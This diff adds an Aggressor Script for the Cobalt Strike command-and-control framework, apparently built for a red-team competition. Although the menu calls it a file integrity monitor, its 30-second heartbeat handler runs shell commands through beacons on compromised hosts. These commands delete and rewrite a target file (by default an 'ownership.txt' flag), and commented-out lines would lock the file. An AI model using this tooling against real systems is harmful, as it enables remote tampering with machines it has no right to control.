@@ -1,0 +1,180 @@
+import ui.*;
+import table.*;
+
+import java.awt.*;
+import javax.swing.*;
+import javax.swing.table.*;
+
+
+global('$model $console $contentPane');
+global('%monitored_files');
+%monitored_files = %();
+
+popup beacon_top {
+    menu "File Integrity Monitor"{
+        item "Include File" {
+            local('$bid');
+            foreach $bid ($1) {
+            	$host = binfo($bid, "external");
+                fileIntegrityMonitor($host);
+                updateHosts();
+            }
+        }
+        item "Clear Monitor" {
+            local('$bid');
+            foreach $bid ($1) {
+                $host = binfo($bid, "external");
+                removeAt(%%monitored_files, $host);
+            }
+            updateHosts();
+        }
+        item "Open Monitor" {
+            $tab = createVisualization();
+        	addTab("File Monitor", $tab, "A table of commands that have been run on all beacons.");
+        }
+    }
+}
+
+sub fileIntegrityMonitor {
+	local('$filepath $contents %temp');
+	
+    $host = $1;
+    
+    
+    if($host in %monitored_files){
+    	%temp = %monitored_files[$host];
+    	$filepath = %temp['filepath'];
+    	$contents = %temp['contents'];
+    } else {
+    	$filepath = "C:\\public\\ownership.txt";
+    	$contents = "D4AD3249";
+    }
+
+    $dialog = dialog("File Integrity Monitor", %(filepath => $filepath, contents => $contents), lambda({
+        $filepath = $3['filepath'];
+        $contents = $3['contents'];
+        %monitored_files[$host]['filepath'] = $filepath;
+        %monitored_files[$host]['contents'] = $contents;
+    }), $host => $host);
+
+    dialog_description($dialog, "Which file do you want to monitor on $host $+ .");
+    drow_text($dialog, "filepath", "Filepath:");
+    drow_text($dialog, "contents", "Contents:");
+    #drow_file($dialog, "test", "Contents:");
+
+    dbutton_action($dialog, "Create");
+    dialog_show($dialog);
+
+}
+
+sub updateHosts {
+    fork({
+        local('$entry');
+
+        # Clear the model so we can put new stuff in it.
+        [$model clear: 256];
+		#println(%monitored_files);
+        foreach $host (keys(%monitored_files)) {
+            %entry["host"] = $host;
+            %entry["filepath"] = %monitored_files[$host]['filepath'];
+            %entry["contents"] = %monitored_files[$host]['contents'];
+            # Add the new entry to $model;
+            [$model addEntry: %entry];
+        }
+        # Update with the new table
+        [$model fireListeners];
+	}, \$model, \%monitored_files);
+}
+
+sub createVisualization {
+# GenericTableModel from table.*
+    $model = [new GenericTableModel: @("host", "filepath", "contents"), "host", 16];
+
+    # Create a table from the GenericTableModel
+    $table = [new ATable: $model];
+
+    # Controls how the column headers will sort the table
+    $sorter = [new TableRowSorter: $model];
+
+    # Builtin compareHosts function allows us to sort by host
+    [$sorter setComparator: 0, &compareHosts];
+    
+    [$sorter toggleSortOrder: 1];
+    # We have to use cmp for comparing filepath, because it's a text string
+    [$sorter setComparator: 1, {
+        return $1 cmp $2;
+    }];
+    
+    # <=> We have to use cmp for comparing content, because it's a text string
+    [$sorter setComparator: 2, {
+        return $1 cmp $2;
+    }];
+
+    # Set $sorter as the row sorter for $table
+    [$table setRowSorter: $sorter];
+
+    # console.Display from ui.*
+    # Because it looks better than a boring text area
+    $console = [new console.Display];
+
+    # Create a split pane (divider you can drag around)
+    $content = [new JSplitPane: [JSplitPane HORIZONTAL_SPLIT], [new JScrollPane: $table], $console];
+
+    # Make spacing look nice by adjusting the split location
+    [$content setDividerLocation: 800];
+	#$content = [new JPanel];
+	#[$content add: [new JScrollPane: $table]];
+
+    updateHosts();
+
+    # Register the visualization with CS
+    return $content;
+}
+
+on heartbeat_30s {
+    local('$filepath $contents $bid $host @currlist');
+
+    @currlist = @();
+
+    foreach $beacon (beacons()) {
+        $bid = $beacon['id'];
+        $host = binfo($bid,"external");
+        $ver = binfo($bid, "ver");
+        $arch = binfo($bid, "barch");
+
+        if ($host in %monitored_files && int(binfo($bid, "last")) < 1000 && ($host !in @currlist)){
+            $filepath = %monitored_files[$host]['filepath'];
+            $contents = %monitored_files[$host]['contents'];
+            @currlist = addAll(@currlist, @($host)); #only queue on one of the living beacons
+
+
+            bshell($bid, "del /f $filepath && echo $contents > $filepath");
+            bshell($bid, "type $filepath ");
+
+            #if (double($ver) > 6.1){
+            #    bpowershell($bid, "\$fileName = $filepath ; \$file = [System.io.File]::Open(\$fileName, 'Open', 'Read', 'Read')");
+            #}else{
+            #    bshell($bid, "title team33shell & ( >&2 pause ) >> $filepath");
+            #}
+
+
+        }
+    }
+    updateHosts();
+}
+
+
+on beacon_initial {
+    updateHosts();
+}
+
+createVisualization();
+# Add an item to the View menu to show our new visualization
+popup view {
+    item "File Monitor" {
+        # Show the visualization
+        $tab = createVisualization();
+        addTab("File Monitor", $tab, "A table of commands that have been run on all beacons.");
+        #showVisualization("FileMonitor");
+    }
+}
